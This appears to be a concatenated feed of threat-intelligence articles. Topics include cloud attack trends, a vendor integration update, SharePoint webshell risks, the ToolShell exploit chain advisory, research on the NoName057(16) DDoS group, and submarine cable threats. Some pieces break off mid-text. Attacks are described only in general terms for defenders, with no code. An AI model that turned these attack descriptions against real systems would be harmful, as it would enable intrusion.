        <p>Cloud technologies, platforms, and services are increasingly implemented into corporate structures, providing all of the benefits of traditional on-premise environments while reducing costs associated with an on-premise environment in nearly every conceivable way. This relationship was <a href="https://www.pwc.com/us/en/tech-effect/cloud/cloud-ai-business-survey.html">demonstrated</a> in PwC’s “2024 Cloud and AI Business Survey,” which reported that, out of a survey of 1,000 companies that implemented cloud technologies, 74% of the surveyed companies that have optimized their cloud environments reported increased profitability, and 65% of the same respondents reported increased cost savings. While these benefits are highly appealing to corporations, cloud environments pose unique risks and security challenges, challenges that require a fresh approach to cybersecurity to mitigate properly.</p>
        <p>The advancement of cloud environments has also increased the number of network-accessible endpoints that an organization must monitor and defend. In instances where large enterprise entities have fully migrated their operations to cloud environments, the endpoints required to facilitate user access, deploy web applications, support data transfer, and provide many other kinds of access on a day-to-day basis add up quickly and create a diverse boundary that is constantly interacting with the broader internet. The technologies that interface with and are embedded within this boundary pose unique risks and security challenges. Looking inward, similar issues persist, with cloud defenders requiring a fresh understanding of how cloud environments can be effectively architected to provide the benefits of a cloud environment without allowing undue access to sensitive information and control over mission-critical assets hosted in these environments.</p>
        <p>As Insikt Group discusses in this report, threat actors have become increasingly aware of the security challenges cloud defenders must address, as well as the opportunities that cloud technologies, environments, and services afford them. The overwhelming amount of data, applications, systems, and other assets hosted on cloud environments, coupled with the task of defending these assets, provides threat actors with novel opportunities to compromise information, abuse environment resources, and profit from illicit activities in ways previously unattainable in on-premise environments. Additionally, threat actors have begun to understand the usefulness of cloud resources as part of an attack chain, realizing they are afforded all of the same benefits of legitimate cloud users, with the added benefits of anonymity and reduced detection capabilities in a way that is unobtainable with traditional infrastructure.</p>
        <p>Understanding the threat posed by these adversaries, this report was created to shed light on the most impactful and emerging tactics, techniques, and procedures (TTPs) displayed by threat actors that target and abuse cloud environments. In doing so, it aims to provide an understanding of how threat actors are impacting and abusing cloud environments at a granular level, as well as how to mitigate these threats and hunt for indicators of compromise associated with them so that cloud defenders are better able to identify and respond when necessary.</p>
        <h2>Methodology</h2>
        <p>This report identified five main threats to cloud environments, each of which are explored their respective sections:</p>
        <ul>
          <li>Cloud Abuse</li>
          <li>Exploitation</li>
          <li>Endpoint Misconfiguration</li>
          <li>Cloud Ransomware</li>
          <li>Credential Abuse and Account Takeover</li>
        </ul>
        <p>Each section includes radar charts that measure the following attributes associated with a given threat. These determinations were derived by Insikt Group investigating instances where this threat vector was observed to answer the following questions:</p>
        <ul>
          <li><strong>Cost of Impact:</strong> How much would this threat cost a victim in terms of monetary, reputational, and operational losses? In the radar chart, the higher the number, the higher the cost the victim can expect to incur monetarily, reputationally, operationally, or otherwise.</li>
          <li><strong>Commonality:</strong> How often is this threat vector observed in attack chains against cloud environments in the wild? In the radar chart, the higher the number, the more likely a cloud defender is to observe this behavior in their own environment.</li>
          <li><strong>Evolution Potential:</strong> What is the potential for threat actors to further “evolve” this attack vector in terms of new tools, attack methods, and TTPs that can be employed to achieve this threat vector? In the radar chart, the higher the number, the more likely it is threat actors will be able to perform actions demonstrating this threat in ways previously unobserved, thus complicating detection of the behavior.</li>
          <li><strong>Effort to Perform:</strong> What are the technical and monetary costs associated with performing this threat vector? In the radar chart, the higher the number, the greater the barrier for an attacker to demonstrate this threat against a cloud environment, generally in terms of monetary cost or technical capability</li>
        </ul>
        <h2>Threats To Cloud Environments</h2>
        <h2>Cloud Abuse</h2>
        <h3>Key Takeaways</h3>
        <ul>
          <li>Attackers registered their own cloud infrastructure to host malicious content and exfiltrate stolen data to their own cloud environments.</li>
          <li>Uses for compromised cloud environments varied heavily and were determined by the responsible threat actor’s goal or proficiency.</li>
        </ul>
        <p><strong>Figure 1</strong> illustrates and compares attributes associated with cloud abuse. A description of each attribute can be found in the <strong>Methodology</strong> section of this report.</p>

          </div>
        </div>
        <p><strong>Cost of Impact: 4 (High)</strong></p>
        <p>Attacks where threat actors abuse victim cloud environments are highly costly, whereas instances where threat actors register and abuse legitimate services are comparatively less costly. In both instances, threat actors are able to masquerade as legitimate entities, leading to reputational losses for the abused environment and owner. Instances where threat actors abuse compromised victim cloud infrastructure often result in increased costs to the owner of the cloud environment.</p>
        <p><strong>Commonality: 4 (High)</strong></p>
        <p>Abuse of legitimate cloud infrastructure registered by a threat actor is very common, whereas abuse of compromised victim cloud infrastructure is comparatively less common. Many observed attacks against cloud infrastructure include threat actors attempting to gain control of cloud services for follow-on actions at some point, indicating that this type of threat remains common with respect to other cloud threats.</p>
        <p><strong>Evolution Potential: 4 (High)</strong></p>
        <p>Threat actors have demonstrated that there are a plethora of ways cloud abuse can be achieved and then leveraged to perform malicious actions within the past year. Additionally, novel techniques such as “LLMjacking,” where threat actors sell access to compromised, cloud-based LLM models, indicate that threat actors are continuously considering how to monetize the abuse of cloud services, forecasting an increase of cloud service abuse in the future.</p>
        <p><strong>Effort to Perform: 3 (Moderate)</strong></p>
        <p>Both the abuse of legitimately registered cloud infrastructure and compromised victim cloud infrastructure pose moderate difficulties to threat actors. In the former threat type, attackers must determine how to register for larger cloud platforms anonymously and conduct malicious actions without being detected, all while paying for the environment. In the latter threat type, threat actors are only able to abuse victim cloud infrastructure after adequately compromising cloud services and systems that are necessary for them to achieve their overarching goals.</p>
        <h2>Threat Summary</h2>
        <p>The term cloud abuse refers to two overarching behaviors threat actors have displayed when targeting cloud environments:</p>
        <ul>
          <li>Abuse of legitimate cloud infrastructure obtained by a threat actor to perform malicious activities</li>
          <li>Abuse of legitimate cloud infrastructure owned by a victim a threat actor compromises to perform malicious activities</li>
        </ul>
        <p>In both instances, threat actors abuse legitimate cloud infrastructure for nefarious purposes; however, the behaviors demonstrated by threat actors in each of these scenarios differ significantly. In the former example, threat actors will mainly abuse these resources to appear as part of legitimate traffic and remain anonymous; this behavior is often used to carry out phishing campaigns, host malicious content, and act as part of the threat actor’s command-and-control (C2) infrastructure. In the latter example, threat actors may still abuse the cloud environment to masquerade as a legitimate entity, but they may also hijack the environment’s resources, shifting costs to the environment’s owner. In such an instance, additional actions such as cryptojacking and a more recent technique, LLMjacking, may occur and result in inflated monetary costs.</p>
        <h2>Outlook</h2>
        <p>Threat actors will almost certainly continue obtaining their own cloud infrastructure for several reasons:</p>
        <ul>
          <li>Threat actors are afforded all of the same benefits legitimate cloud users are provided, in addition to anonymizing factors that aid in malicious actions (see Figure 2).</li>
          <li>It is relatively easy to obtain cloud infrastructure from CSPs without extensive scrutiny from the provider, allowing attackers to create extensive cloud environments without suspicion.</li>
          <li>Abuse of legitimately registered cloud environments is often identified reactively following malicious actions originating from the environment, indicating that CSPs do not have a reliable method of detecting cloud abuse prior to victim compromise.</li>
          <li>Threat actors are easily able to pivot from one cloud provider to another and are able to mask their identities while performing malicious actions when abusing cloud resource</li>
        </ul>

            <description><![CDATA[Discover powerful new updates to Recorded Future’s Google Security Operations integrations, including expanded SOAR automation and a brand-new SIEM integration to elevate your threat intelligence and response.]]></description>
            <content:encoded><![CDATA[
        <p>In August 2024, <a href="https://www.recordedfuture.com/blog/recorded-future-for-google-security-operations">we announced enhancements</a> to our integration of Recorded Future with Google Security Operations. The enhancements were designed to better integrate Recorded Future Threat Intelligence into the Google Security Operations platform.</p>
        <p>Now, we’re excited to introduce updates to our integration with Google Security Operations. This means that you’ll have Recorded Future intelligence more comprehensively integrated throughout the end-to-end experience when using your Google Security Operations platform.</p>
        <h2>Significant SOAR integration enhancements</h2>
        <p>We’ve expanded our SOAR updates to more completely track intelligence from Recorded Future and close the feedback loop from Google Security Operations response workflow and capabilities to Recorded Future.</p>
        <p>First, we’ve added a Collective Insights® capability. By running the Recorded Future enrichment action with Collective Insights enabled, you can enrich entities and send Collective Insights to Recorded Future. This will happen for any entity that’s enriched, whether you’re manually executing the action or running it within an enrichment playbook.</p>
        <p>Second, we’ve added support for playbook alerts. Google Security Operations can now ingest the following playbook alert types: Domain Abuse, Data Leakage on Code Repository, Identity Novel Exposures, Geopolitical - Facility Risk Event, and Vulnerability. Cases are created for new playbook alerts with supporting evidence, and full alert details are ingested into separate panels. Entities within playbook alerts are added to an Entity Highlights panel. And you can track playbook alert updates via a dedicated connector.<br /><br />Third, we’ve added support for sandboxing URLs and files. They’re sandboxed asynchronously, and the sandbox actions check results from Recorded Future every minute for half an hour. When results become available, cases are automatically updated with sandbox enrichment from Recorded Future.</p>
        <p>Finally, Google Security Operations users can now author analyst notes for entities, and the notes can be viewed in the Recorded Future portal.</p>
        <h2>All-new SIEM integration</h2>
        <p>You can deploy our new integration with Google Security Operations from our <a href="https://github.com/RecordedFuture-ProfessionalServices/gsecops-siem-integration">GitHub repository</a>.</p>
        <p>The new functionality:</p>
        <ul>
          <li>Expands IOC types to include file hashes and URLs</li>
          <li>Ages out old IOCs correctly to prevent false positives</li>
          <li>Allows for the use of custom risklists created for Google Security Operations</li>
          <li>Parses indicators efficiently to reduce ingestion size</li>
          <li>Populates UDM fields to more closely align with Google Security Operations best practices</li>
          <li>Includes Yara-L rules to correlate threat intelligence against detection rule matches where the entity was sourced from a Recorded Future risklist</li>
          <li>Includes dashboards that provide a global view of Recorded Future threat intelligence in your Google Security Operations environment and track IOC matches for IPs and domains</li>
        </ul>
        <h2>Powerful integrations that strengthen your security posture</h2>
        <p>With these updates, Recorded Future data supports every part of the intelligence lifecycle in Google Security Operations — and you can customize the way you view and use the data to fit your workflows.</p>
        <p>Our work on these integrations is ongoing, so be on the lookout for more enhancements in the coming months.</p>

        <p><strong>Everyone is tired</strong> of reading about yet another Microsoft <strong>SharePoint</strong> vulnerability, and understandably so. Each new critical SharePoint flaw (often enabling remote code execution) brings a sense of déjà vu and patch fatigue. Depending on how you want to snap the chalk line, since the SharePoint platform debuted in 2001, there have been at least ~700 distinct <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sharepoint">CVE-listed vulnerabilities</a> (CVE != exploit count; includes “Server,” “Foundation,”<br />“Online,” etc.). Roughly a third of those vulnerabilities were published after 2020, most likely due to larger bug-hunting incentives and better tools (particularly AI-assisted fuzzers).</p>
        <p><strong>However</strong>, these recurring incidents carry valuable <strong>big-picture risk lessons</strong>. Dismissing these incidents as routine misses profound shifts in the threat landscape. Microsoft's SharePoint environment serves millions of organizations worldwide, making any vulnerability a <a href="https://www.itpro.com/security/cyber-attacks/sharepoint-flaw-microsoft-says-hackers-deploying-ransomware">systemic risk multiplier</a> that extends far beyond individual patch management. The latest deserialization flaw represents more than a single security advisory; it signals fundamental challenges with legacy application stacks, detection blind spots that traditional security controls consistently miss, and an accelerating timeline where AI-powered vulnerability research eliminates the safety buffer of phased upgrades and architecture changes.</p>
        <p>Organizations relying on checkbox compliance will find themselves unprepared for sophisticated attack chains that exploit architectural weaknesses while evading traditional defensive measures.</p>

        <p><strong>The deserialization dilemma</strong></p>
        <p>Deserialization vulnerabilities plague older development frameworks with mathematical certainty. The attack vector exploits a fundamental flaw: applications trust serialized data without validation, allowing attackers to inject malicious objects that execute arbitrary code during the deserialization process.</p>
        <p>SharePoint's vulnerability exemplifies this pattern perfectly. The platform accepts serialized data streams and processes them without sufficient input validation, creating opportunities for remote code execution. OWASP now ranks insecure <a href="https://owasp.org/www-project-top-ten/">deserialization among its Top 10</a> application security risks, yet countless enterprise applications continue operating with these architectural time bombs.</p>
        <p>The remediation path requires strategic thinking beyond patch management. Organizations must evaluate <a href="https://media.defense.gov/2023/Dec/06/2003352724/-1/-1/0/THE-CASE-FOR-MEMORY-SAFE-ROADMAPS-TLP-CLEAR.PDF">migration strategies toward memory-safe languages like Go and Rust</a>, which eliminate entire classes of deserialization attacks through design rather than defensive coding. Modern development frameworks incorporate serialization safety by default, making legacy platform modernization a security imperative rather than a technical preference.</p>
        <p>AI fundamentally changes the vulnerability discovery equation. Machine learning-powered fuzzing tools can analyze millions of code paths and input <a href="https://arxiv.org/abs/2505.03425">combinations in hours rather than months</a>, systematically identifying edge cases that manual code review misses. Organizations previously relied on the assumption that obscure legacy applications would remain undiscovered by attackers—this safety buffer no longer exists.</p>
        <p>Automated vulnerability research now targets frameworks with known architectural patterns, particularly deserialization implementations in Java, .NET, and PHP applications. The time between vulnerability introduction and discovery continues to <a href="https://www.netizen.net/news/post/6259/ai-drastically-accelerates-exploit-development-for-cve-2025-32433">compress as AI tools become more sophisticated and accessible</a>. Legacy applications containing dormant remote code execution flaws face inevitable disclosure through automated analysis rather than manual research efforts.</p>
        <p>AI-assisted code translation significantly accelerates migration transitions. Automated refactoring tools can analyze existing codebases and suggest migration patterns, reducing the traditional barriers of cost and complexity that keep organizations anchored to vulnerable platforms.</p>
        <p><strong>Webshells: the compliance blind spot</strong></p>
        <p>Traditional malware detection operates on predictable behavioral patterns: network callbacks, persistence mechanisms, and command infrastructure. Webshells shatter these assumptions entirely.</p>
        <p>A webshell appears as an innocent PHP, ASP, or JSP file sitting quietly in a web directory. Unlike conventional malware, webshells establish no external connections and exhibit minimal system interaction. They function as dormant backdoors, activated only when attackers submit specific HTTP requests containing commands or credentials.</p>
        <p>The scale of webshell-enabled breaches over the past two years demonstrates this detection gap. Four examples:</p>
        <ul>
          <li>The MOVEit Transfer exploitation in 2023 affected hundreds of organizations globally, with attackers deploying webshells named "human2.aspx" to maintain persistence and exfiltrate data.</li>
        </ul>
        <ul>
          <li>Ivanti Connect Secure VPN vulnerabilities led to over 1,700 compromised devices through webshell deployment, with threat actors using tools like GIFTEDVISITOR and GLASSTOKEN to maintain access.</li>
        </ul>
        <ul>
          <li>SysAid's zero-day vulnerability (CVE-2023-47246) allowed threat actors to deploy webshells and subsequently inject malware into Windows system processes.</li>
        </ul>
        <ul>
          <li>PaperCut MF/NG vulnerabilities enabled multiple ransomware groups, including Lace Tempest and Bl00dy, to deploy webshells for persistent access.</li>
        </ul>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1a1c5d4919c73cccc2961523fde47021cbe73cd3d.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="885" />

          </div>
        </div>
        <p>This architectural simplicity creates detection nightmares. <strong>Web application firewalls (WAFs)</strong> excel at blocking SQL injection and cross-site scripting attacks but <strong>struggle with webshells</strong> that mimic legitimate administrative scripts. The files contain valid application code and often communicate through standard HTTP protocols, reducing behavioral analysis effectiveness.</p>
        <p>● <a href="https://www.recordedfuture.com/blog/web-shell-analysis-part-1">Webshells persist</a> without traditional malware signatures or network indicators</p>
        <p>● They leverage existing application infrastructure rather than installing new components</p>
        <p>● Detection requires suspicious process analysis (file integrity monitoring is generally useless on web servers, as content and associated files constantly change per the server’s purpose)</p>
        <p>● Memory-resident variants eliminate traditional file-based hunting techniques</p>
        <p>Compliance frameworks treat webshells under broad "malware" requirements, creating false confidence among security teams. <strong>Organizations assume their endpoint protection platforms will detect these threats automatically, overlooking the fundamental difference between traditional malware and web-based backdoors.</strong></p>

Memory forensics become essential when attackers deploy fileless webshells that exist solely in application memory spaces.</p>
        <p><strong>The intelligence advantage</strong></p>
        <p>Threat intelligence transforms vulnerability management from reactive patching to proactive risk assessment. The SharePoint vulnerability demonstrates this principle through clear attack progression signals that preceded widespread exploitation.</p>
        <p>Initial disclosure occurred at Pwn2Own in May 2025, providing organizations with months of advance warning. Chinese-language security forums began discussing exploitation techniques approximately one week before automated exploitation commenced. This timeline offered multiple opportunities for intelligence-driven preparation.</p>
        <p>Holistic threat intelligence platforms aggregate these early warning signals across diverse sources, including security research communities, <a href="https://www.recordedfuture.com/blog/vulnerability-risk-analysis">underground forums</a>, and code repositories.</p>
        <p><strong>Honeynets and active monitoring</strong></p>
        <p>Passive vulnerability scanners provide incomplete visibility into emerging threats. Active monitoring systems, including honeynets, port scanners, and service fingerprinting tools, detect exploitation attempts in real-time and identify vulnerable services before attackers do.</p>
        <p>Organizations deploying SharePoint honeypots observed initial scanning activities within 48 hours of public exploit code availability. These systems captured attack payloads, revealed targeting patterns, and provided early warning for production environment protection.</p>
        <p><strong>Building proactive resilience</strong></p>
        <p>The most recent SharePoint vulnerability exposes broader systemic challenges that checkbox compliance cannot address. Organizations treating security as a compliance exercise will consistently lag behind threat actors who exploit architectural weaknesses and capitalize on blind spots.</p>
        <p>Proactive resilience requires understanding attack progression patterns, performing control validation, investing in specialized detection capabilities, and <a href="https://www.recordedfuture.com/blog/toolshell-exploit-chain-thousands-sharepoint-servers-risk">leveraging intelligence</a> to guide strategic security decisions. When legacy code becomes a liability, the organizations that recognize and respond to security debt will maintain a competitive advantage through superior threat response and business continuity.</p>

            <content:encoded><![CDATA[
        <p>A zero-day exploit chain called "ToolShell" is actively being used to target on-premises Microsoft SharePoint servers worldwide, potentially affecting thousands of organizations. The attack leverages two critical vulnerabilities (CVE-2025-53770 and CVE-2025-53771) to achieve remote code execution and steal cryptographic keys, giving attackers persistent access even after organizations apply patches.</p>
        <p>These vulnerabilities apply to on-premises SharePoint Servers only. SharePoint Online in Microsoft 365 has not been impacted.</p>
        <p>Read on to understand the ToolShell threat and how to defend against it with hunting packages, including Nuclei and YARA rules, from Recorded Future.</p>
        <h2>The latest Tactics, Techniques, and Procedures (TTPs)</h2>
        <p>On July 23, 2025, researchers at LeakIX <a href="https://x.com/Gi7w0rm/status/1948027800591466773">shared</a> details that adversaries have swiftly evolved their TTPs to be stealthier and eliminate the reliance on .ASPX web shells. A new in-memory ToolShell payload has been identified that allows adversaries to leak ASP.NET machine keys directly from memory without leaving behind static artifacts. Adversaries no longer need to rely on static file-based indicators, making traditional detection methods such as checking for web shells unreliable. This new payload directly extracts sensitive machine keys and system information from memory and exfiltrates the data immediately via a single HTTP request, enabling rapid and stealthy compromise.</p>
        <p>The Insikt Group® used Recorded Future’s Malware Intelligence feature to identify this new in-memory ToolShell payload and created a <a href="https://assets.recordedfuture.com/strapi/yaml-yar/MAL_Tool_Shell_4eab68f2e0.yar">YARA rule</a> capable of detecting the in-memory ToolShell payload.</p>
        <p>This new ToolShell payload is available on Recorded Future’s public sandbox:</p>
        <div>
          <div>
            <div><strong>File Name</strong></div>
            <div><strong>SHA256</strong></div>
          </div>
          <div>
            <div><a href="https://tria.ge/250723-tes3qshj6t/behavioral1">osvmhdfl.dll</a></div>
            <div>3461da3a2ddcced4a00f87dcd7650af48f97998a3ac9ca649d7ef3b7332bd997</div>
          </div>
        </div>
        <h2>Background and first exploitation chain</h2>
        <p>Previously, cybersecurity researchers at Eye Security on July 18 published details of an ongoing mass exploitation campaign targeting internet-exposed on-premises SharePoint servers.</p>
        <p>The ToolShell exploit chain combines two critical unauthenticated remote code execution vulnerabilities that specifically target on-premises SharePoint servers configured with hybrid Active Directory Federation Services (ADFS). These vulnerabilities are essentially sophisticated bypasses of earlier security fixes, demonstrating how threat actors continue to evolve their techniques in response to security efforts.</p>
        <p>ToolShell represents an evolution of an exploit chain first demonstrated at Pwn2Own Berlin in May 2025, where security researchers combined an authentication-bypass vulnerability (CVE-2025-49706) with a remote code execution flaw (CVE-2025-49704). The current campaign uses:</p>
        <ul>
          <li><strong>CVE-2025-53770</strong>, which exploits insecure deserialization to conduct remote code execution</li>
          <li><strong>CVE-2025-53771</strong>, which bypasses authentication controls via path traversal</li>
        </ul>
        <p>What makes this attack particularly dangerous is that successful exploitation provides threat actors with SharePoint's ValidationKey and DecryptionKey—cryptographic keys that enable persistent access to compromised servers even after security patches are applied.</p>
        <h2>Scale and impact</h2>
        <p>Recorded Future's <a href="https://www.recordedfuture.com/products/attack-surface-intelligence">Attack Surface Intelligence</a> proactively scanned our customer base and confirmed that nearly 5% of organizations scanned with SharePoint servers were still susceptible to CVE-2025-53770. We immediately deployed alerts to affected customers within hours of implementing detection capabilities—giving them critical advance warning before the vulnerability gained widespread media attention.</p>
        <p><a href="https://www.bloomberg.com/news/articles/2025-07-23/tally-of-microsoft-victims-surges-as-hackers-race-to-capitalize">Bloomberg</a> reported on July 23 that there were over 400 victims of the exploitation campaign targeting on-premises Microsoft SharePoint servers.</p>
        <h2>Using Recorded Future's Malware Intelligence to identify and neutralize the ToolShell threat</h2>
        <p>Despite the updated TTP which allows attackers to no longer rely on static file-based indicators to leak ASP.NET machine keys, the Insikt Group® used the Recorded Future’s Malware Intelligence feature to identify several malicious artifacts tied to prior iteration of ToolShell exploitation campaign. These samples provide further insight into the exploit chain’s post-compromise behavior, particularly around key extraction, persistence, and web shell deployment.</p>
        <p>Those previous static malware artifacts are all available on Recorded Future’s public sandbox:</p>

        <h2>Who’s behind the attack, and what will happen next?</h2>
        <p>On July 22, 2025, Microsoft <a href="https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/">disclosed</a> that at least three Chinese state-sponsored threat actors have been exploiting the ToolShell zero-day since at least July 7, 2025. These are Linen Typhoon (which historically overlaps with TAG-67 as tracked by Recorded Future), Violet Typhoon (which historically overlaps with RedBravo as tracked by Recorded Future), and Storm-2603. The actors exploited CVE-2025-49704 (RCE) and CVE-2025-49706 (spoofing) to compromise on-premises SharePoint servers, with additional vulnerabilities CVE-2025-53770 and CVE-2025-53771 affecting previously patched systems.</p>
        <p>Linen Typhoon has been known to exploit zero-day and n-day vulnerabilities for initial access, and to exploit known vulnerabilities years after they were initially disclosed. For example, in 2021, the threat group <a href="https://www.bleepingcomputer.com/news/security/german-govt-warns-of-apt27-hackers-backdooring-business-networks/">exploited</a> a zero-day vulnerability in Zoho AdSelf Service Plus.</p>
        <p>Chinese threat groups have increasingly <a href="https://www.recordedfuture.com/research/charting-chinas-climb-leading-global-cyber-power">adopted</a> internet-facing appliance exploitation as a scalable initial access strategy, allowing them to establish footholds across numerous organizations simultaneously.</p>
        <p>Insikt Group® assesses at this stage that it is likely that multiple other threat groups beyond Linen Typhoon, Violet Typhoon, and Storm-2603 will actively seek to exploit on-premise SharePoint instances, especially following the public release of proof-of-concept exploit code.</p>
        <p>Our intelligence indicates that the current campaign represents an early phase of what will likely become a prolonged exploitation effort. We will continue to monitor and analyze the threat in real time and will share any updates on intelligence and mitigation strategies as they become available.</p>

          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <p>Analysis cut-off date: July 17, 2025</p>
        <h2>Executive Summary</h2>
        <p>Insikt Group tracked pro-Russian hacktivists “NoName057(16)” targeting more than 3,700 unique hosts over the last thirteen months (July 1, 2024, to July 14, 2025). Targeted hosts were primarily government and public-sector entities in European nations opposing Russia’s invasion of Ukraine. NoName057(16) emerged in March 2022, just days after Russia’s full-scale invasion of Ukraine, and has since waged a sustained, large-scale distributed denial-of-service (DDoS) campaign through its volunteer-driven “DDoSia” platform. The threat group maintains a high operational tempo, averaging 50 unique targets daily, with intense bursts of activity correlating to geopolitical and military developments in Ukraine. In addition, leveraging Recorded Future Network Intelligence and additional methodologies, Insikt Group conducted a comprehensive technical analysis that revealed a multi-tiered infrastructure consisting of rapidly rotated Tier 1 command-and-control (C2) servers and Tier 2 servers protected by access control lists (ACLs) to restrict upstream access and maintain reliable C2 functionality. Finally, pattern-of-life analysis strongly indicates that NoName057(16) conducts its operations from within a Russian time zone.</p>
        <p>In the short term, defenders should adopt security best practices by deploying layered DDoS protection, leveraging content delivery networks (CDNs), configuring web application firewalls (WAFs), enforcing network controls such as IP blocking and rate limiting, and establishing a tested incident response plan that includes business continuity, communication, and escalation procedures. These defensive strategies should be complemented by investments in situational awareness to anticipate emerging DDoS campaigns, monitor threat actor activity across forums and coordination channels, and track incidents affecting peer organizations and countries, which often serve as early indicators of broader targeting. Additionally, law enforcement is expected to continue playing a role in countering such activities, as demonstrated by Operation Eastwood between July 14 and 17, 2025, though the long-term effectiveness of such efforts remains uncertain.</p>
        <p>Hacktivist-driven DDoS attacks, state-sponsored or state-encouraged pseudo-ransomware operations, disinformation campaigns, acts of physical sabotage, and other asymmetric operations have become a persistent feature of geopolitical conflict deliberately calibrated to remain below the threshold of conventional warfare. Organizations operating in these hybrid warzones — in this case, within NATO-aligned European countries — must prepare for this threat to be a long-term reality. Regardless of the specific geopolitical context, it is increasingly clear that states will both conduct such activities directly and co-opt non-state threat actors to advance their strategic agendas. Accordingly, maintaining close visibility into this evolving threat landscape and monitoring geopolitical tensions should be integral to any effective risk management strategy.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>NoName057(16) has implemented a multi-tiered infrastructure in which Tier 1 C2 servers rapidly refresh, with an average lifespan of nine days. These Tier 1 C2 servers are exclusively permitted to establish connections to Tier 2 servers, which are secured via ACLs.</li>
          <li>From June 2024 to July 2025, NoName057(16) sustained a high and steady operational tempo, launching attacks against an average of 50 unique hosts per day, with activity peaking at 91 in a single day. Over the course of the analysis period, a total of 3,776 distinct hosts were targeted.</li>
          <li>The attacks demonstrated clear geographic concentration, with Ukrainian organizations comprising the largest share of targets (29.47%), followed by allied countries including France (6.09%), Italy (5.39%), and Sweden (5.29%). Notably, the US has not been a primary target of DDoSia, despite its support for Ukraine.</li>
          <li>By sector, the government and public sectors were the most heavily targeted, accounting for 41.09% of all observed attacks. This was followed by the transportation and logistics sectors at 12.44% and the technology, media, and communications sectors at 10.19%.</li>
          <li>NoName057(16)'s operators likely adhere to a standard Russian work schedule as new targets are consistently added in two distinct waves daily, peaking between 05:00 and 07:00 UTC and around 11:00 UTC on weekdays.</li>
        </ul>
        <h2>Background</h2>
        <h3>NoName057(16)</h3>
        <p>NoName057(16) is a pro-Russian hacktivist group that <a href="https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/">emerged</a> in March 2022, shortly after Russia's full-scale invasion of Ukraine. The threat group is known for <a href="https://blog.sekoia.io/noname05716-ddosia-project-2024-updates-and-behavioural-shifts/">conducting</a> distributed denial-of-service (DDoS) attacks against Ukraine and its allies, particularly <a href="https://www.netscout.com/blog/asert/noname057-16">NATO members</a>. The threat group's activities are not financially motivated but are driven by a <a href="https://cybelangel.com/unmasking-noname05716/">political agenda</a> rooted in Russian nationalism. NoName057(16) <a href="https://decoded.avast.io/martinchlumecky/ddosia-project/">operates</a> a volunteer-based model, recruiting participants via its Telegram channels, providing them with the necessary tools and infrastructure, and <a href="https://decoded.avast.io/martinchlumecky/ddosia-project/">rewarding</a> contributors with cryptocurrency.</p>
        <p>The threat group's alignment with Russia's strategic interests is clear and functions as an unofficial cyber warfare asset for Russia. This connection is consistently reinforced through the threat group's public communications on Telegram, where it frames its attacks as direct retaliation for actions taken by Russia’s adversaries. For example, NoName057(16) justified attacks on Lithuanian infrastructure as "revenge for Kaliningrad" after the enforcement of EU sanctions, <a href="https://www.bankinfosecurity.com/danish-banks-targets-pro-russian-ddos-hacking-group-a-20902">targeted</a> Danish financial institutions for Denmark's support of Ukraine, and <a href="https://www.infosecurity-magazine.com/news/noname05716-hit-italian-banks/">attacked Italian</a> websites following "Russophobic" comments by the Italian president. This pattern highlights the threat group's role as digital partisans acting on Russia's geopolitical narrative, aiming to disrupt organizations it deems hostile.</p>
        <h3>The DDoSia Project</h3>
        <p>The threat group's primary weapon is a custom DDoS tool named "DDoSia", the <a href="https://blog.avast.com/ddosia-project">successor</a> to an earlier botnet called Bobik. The tool facilitates application-layer DDoS attacks by inundating target websites with a high volume of junk requests. The operational framework surrounding this tool is known as the "DDoSia Project", which encompasses the entire ecosystem of tools, infrastructure, and volunteers. The DDoSia client is a user-friendly, <a href="https://asec.ahnlab.com/en/84531/">Go-based tool</a> that communicates with a C2 server to obtain a list of targets. Volunteers run the tool on their devices, using a unique "User Hash" as an access key. This key is required to receive targets and contribute to attacks, a method likely intended to hinder analysis by security researchers. The tool is designed to be easy to use, allowing individuals with little to no technical expertise to participate in the threat group's operations.</p>
        <p>In this report, “operators” refers to the threat actors responsible for developing the DDoSia Project and creating target lists for NoName057(16), while “volunteers” refer to the individuals who execute attacks using the DDoSia too</p>

            <description><![CDATA[Explore the rising threats to global submarine cable networks amid escalating geopolitical tensions, sabotage incidents, and limited repair capacity. Discover essential resilience strategies and risk mitigation measures.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>Events over the last eighteen months indicate that the risk environment for submarine cables has very likely escalated, and the threat of state-sponsored malicious activity targeting submarine cable infrastructure is likely to rise further amid heightened geopolitical tensions. Insikt Group’s assessment of the current risk environment for submarine cables aligns with the findings of our 2023 assessment, which highlighted the convergence of geopolitical, physical, and cyber threats. Based on an analysis of 44 publicly reported cable damages occurring in 32 distinct groupings in 2024 and 2025 (Appendix A), Insikt Group assesses that three factors in the submarine cable ecosystem –– lack of redundancy in cable networks, lack of diversity of cable routes, and limited global repair capacity –– very likely increase the likelihood of significant outages from damages. Regions with low redundancy, such as parts of West and Central Africa, isolated Pacific islands, and certain secondary European routes, are more likely to suffer disproportionate impact from cable damage, especially when geopolitical tensions coincide with infrastructure constraints.</p>
        <p>While accidents will very likely continue to cause the majority of day-to-day interruptions, recent incidents in the Baltic Sea and around Taiwan indicate that submarine cable systems remain vulnerable to threats such as anchor dragging, which states can use as a low-sophistication tactic to target adversaries’ critical infrastructure while maintaining plausible deniability. Insikt Group identified four incidents involving eight distinct cable damages in the Baltic Sea and five incidents involving five distinct cable damages around Taiwan in 2024 and 2025. At least five of these nine incidents were attributed to ships dragging their anchors, including four Russia- or China-linked vessels operating under suspicious circumstances or with opaque ownership structures, although the resulting investigations have highlighted the difficulty of attributing cable cuts to state-sponsored sabotage. Such campaigns attributed to Russia in the North Atlantic–Baltic region and China in the western Pacific are likely to increase in frequency as tensions rise, leveraging deniable tactics in both shallow and deep water to apply political pressure without overt escalation.</p>
